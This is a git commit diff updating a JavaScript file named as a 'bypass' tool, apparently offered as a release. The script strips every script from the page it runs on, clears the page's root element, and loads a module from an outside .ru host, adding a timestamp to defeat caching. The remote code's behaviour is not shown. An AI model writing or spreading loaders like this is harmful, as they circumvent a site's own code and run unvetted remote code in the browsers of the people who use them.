c8e605f8732d0d6ee1d84fd26a2761d9c0748116
RGB | Outlaw <101356538+RGB-Outl4w@users.noreply.github.com>
2024-03-29 22:43:58 +0400

    Update bypass_PC_TPAR_v4.x.js

--- releases/bypass_PC_TPAR_v4.x.js
+++ releases/bypass_PC_TPAR_v4.x.js
@@ -1,17 +1,11 @@
-var h = {
-    drawMode: 6
-};
-
-window.monkeyPatch = h;
-
 unixTime = Date.now();
 
-document.querySelector("script").remove();
-document.getElementById("root").innerHTML = "";
+document.querySelectorAll('script').forEach((func) => func.remove())
+document.getElementById('root').innerHTML = ''
 
 var s = document.createElement("script");
 s.type = "text/javascript";
-s.src = "https://pipyoutube.ru/cats/index-GKUHWpC_.js?1234";
+s.src = "https://pipyoutube.ru/cats/index-GKUHWpC_.js"+"?"+unixTime;
 s.type = "module";
   
 document.head.appendChild(s);
